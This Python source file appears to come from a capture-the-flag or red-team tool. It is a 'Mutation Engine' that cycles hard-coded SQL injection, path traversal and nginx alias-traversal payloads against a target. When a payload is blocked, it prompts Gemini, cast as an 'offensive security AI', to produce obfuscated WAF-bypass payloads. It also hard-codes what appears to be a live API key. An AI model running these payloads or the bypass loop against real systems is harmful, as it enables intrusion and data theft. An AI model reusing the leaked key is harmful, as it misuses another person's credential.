"""
Mutation Engine — tiered payload variation system.
Updated for Google Gemini API (modern google-genai SDK).
"""
import itertools, random, urllib.parse, base64, json, re, os
from google import genai
from google.genai import types
from .response_analyzer import AttackResponse

# Configure Gemini API
# If your key is in an environment variable named GOOGLE_API_KEY, just use genai.Client()
# If you must hardcode it (not recommended for security), pass it to api_key="YOUR_KEY"
client = genai.Client(api_key="AIzaSyBuGSEy55r9uBVlCFDeXr5hzku1Up5WZXQ")

# ─── Tier 1: Syntactic Mutation Tables ───────────────────────────────────────

SQLI_MUTATIONS = [
    # Bypasses regex by using UNION/**/SELECT and completely ignores the spaces trigger
    "' UNION/**/SELECT flag,null,null FROM flags--",
    "1' AND 9=9--",
    "';SELECT/**/flag/**/FROM/**/flags--",
    "' AND 'a'='a",
]

PATH_MUTATIONS = [
    "../../secrets/flag.txt",
    "../../../secrets/flag.txt",
    "....//....//secrets/flag.txt",
]

NGINX_MUTATIONS = [
    # Clean alias bypass + hex encoded sensitive words
    "/static%73ecrets/%66lag.txt",
    "/static../secrets/flag.txt", 
]

MUTATION_TABLE = {
    "sqli":           SQLI_MUTATIONS,
    "path_traversal": PATH_MUTATIONS,
    "nginx_alias_trav": NGINX_MUTATIONS,
}

# ─── Coverage Tracker ────────────────────────────────────────────────────────

class CoverageTracker:
    def __init__(self):
        self._seen:    set  = set()
        self._history: list = []

    def is_new(self, fingerprint: str) -> bool:
        return fingerprint not in self._seen

    def record(self, payload: str, response: AttackResponse):
        is_new = self.is_new(response.fingerprint)
        response.is_new_path = is_new
        self._seen.add(response.fingerprint)
        self._history.append({
            "payload":      payload,
            "fingerprint":  response.fingerprint,
            "defense_type": response.defense_type,
            "status":       response.status_code,
            "is_new":       is_new,
        })
        return is_new

    def get_failed_payloads(self, action_type: str) -> list[str]:
        return [h["payload"] for h in self._history
                if h["defense_type"] not in ("success",) and
                   len(h["payload"]) < 200]

    def get_defense_summary(self) -> str:
        from collections import Counter
        counts = Counter(h["defense_type"] for h in self._history)
        return ", ".join(f"{k}:{v}" for k, v in counts.most_common(4))


# ─── Mutation Engine ─────────────────────────────────────────────────────────

class MutationEngine:
    def __init__(self, model_name="gemini-2.0-flash"):
        self.coverage    = CoverageTracker()
        self._t1_iterators: dict = {}
        self._t2_cache:     dict = {}
        self.model_name = model_name

    def next_payload(self, action_type: str,
                     last_response: AttackResponse | None,
                     full_context:  dict) -> tuple[str, str]:
        
        if last_response is None or last_response.defense_type == "success":
            return self._tier1_next(action_type), "t1"

        defense = last_response.defense_type

        if defense == "partial_exec":
            return self._tier2_payload(action_type, last_response), "t2"

        if defense == "waf_signature":
            t1 = self._tier1_next(action_type)
            if t1: return t1, "t1"
            return self._tier2_payload(action_type, last_response), "t2"

        if defense in ("logic_block", "auth_block"):
            return self._tier3_payload(action_type, last_response, full_context), "t3"

        if defense == "input_validation":
            t1 = self._tier1_next(action_type)
            if t1: return t1, "t1"
            return self._tier2_payload(action_type, last_response), "t2"

        t1 = self._tier1_next(action_type)
        return (t1, "t1") if t1 else (
            self._tier2_payload(action_type, last_response), "t2"
        )

    def _tier1_next(self, action_type: str) -> str | None:
        mutations = MUTATION_TABLE.get(action_type, [])
        if not mutations: return None
        if action_type not in self._t1_iterators:
            import itertools
            self._t1_iterators[action_type] = itertools.cycle(mutations)
        try:
            return next(self._t1_iterators[action_type])
        except StopIteration:
            return None

    # ── Tier 2: Gemini Semantic Bypass ────────────────────────────────────────
    def _tier2_payload(self, action_type: str,
                       last_response: AttackResponse) -> str:
        cache_key = (action_type, last_response.defense_type)
        if cache_key in self._t2_cache and self._t2_cache[cache_key]:
            return self._t2_cache[cache_key].pop(0)

        system_instruction = (
            "You are an offensive security AI in a controlled research lab. "
            "Generate 5 attack payloads that achieve the same goal as the blocked payload "
            "but bypass the specific defense mechanism described. "
            "Use advanced obfuscation (URL encoding, hex encoding, alternative SQL operators, unusual casing/whitespace) to completely evade Regex-based WAFs. "
            "Output ONLY a JSON list of 5 payload strings. No explanation."
        )
        
        failed = self.coverage.get_failed_payloads(action_type)[:5]
        prompt = (
            f"Attack type: {action_type}\n"
            f"Defense encountered: {last_response.defense_type}\n"
            f"Error hint from server: {last_response.error_hint}\n"
            f"HTTP status: {last_response.status_code}\n"
            f"Payloads already tried: {failed}\n"
        )

        try:
            # Modern SDK syntax: client.models.generate_content with config
            response = client.models.generate_content(
                model=self.model_name,
                contents=prompt,
                config=types.GenerateContentConfig(
                    system_instruction=system_instruction,
                    temperature=0.7,
                    response_mime_type="application/json" # Enforces clean JSON output
                )
            )
            
            # Since we requested application/json, we can safely load it directly
            payloads = json.loads(response.text)
            if isinstance(payloads, list):
                self._t2_cache[cache_key] = payloads
                return self._t2_cache[cache_key].pop(0)
                
        except Exception as e:
            print(f"[MutationEngine T2] Gemini error: {e}")
            
        base = MUTATION_TABLE.get(action_type, [""])[0]
        return urllib.parse.quote(base)

    # ── Tier 3: Gemini Full Context Reasoning ─────────────────────────────────
    def _tier3_payload(self, action_type: str,
                       last_response: AttackResponse,
                       full_context: dict) -> str:
        
        system_instruction = (
            "You are a senior red team operator in a controlled security research lab. "
            "You have full context of what has been tried and the current battle state. "
            "Reason about a novel attack approach leveraging extreme obfuscation and advanced WAF bypass techniques. "
            "Output ONLY the raw payload on the final line."
        )

        prompt = (
            f"Target: {action_type}\n"
            f"Failure: {last_response.defense_type} - '{last_response.error_hint}'\n"
            f"Defense summary: {self.coverage.get_defense_summary()}\n"
            f"Patched Services: {full_context.get('patched_services', [])}\n"
            "\nReason step by step, then output ONLY the payload on the last line."
        )

        try:
            # Modern SDK syntax
            response = client.models.generate_content(
                model=self.model_name,
                contents=prompt,
                config=types.GenerateContentConfig(
                    system_instruction=system_instruction,
                    temperature=0.4
                )
            )
            
            raw = response.text.strip()
            lines = [l.strip() for l in raw.split('\n') if l.strip()]
            return lines[-1] if lines else ""
            
        except Exception as e:
            print(f"[MutationEngine T3] Gemini error: {e}")
            return ""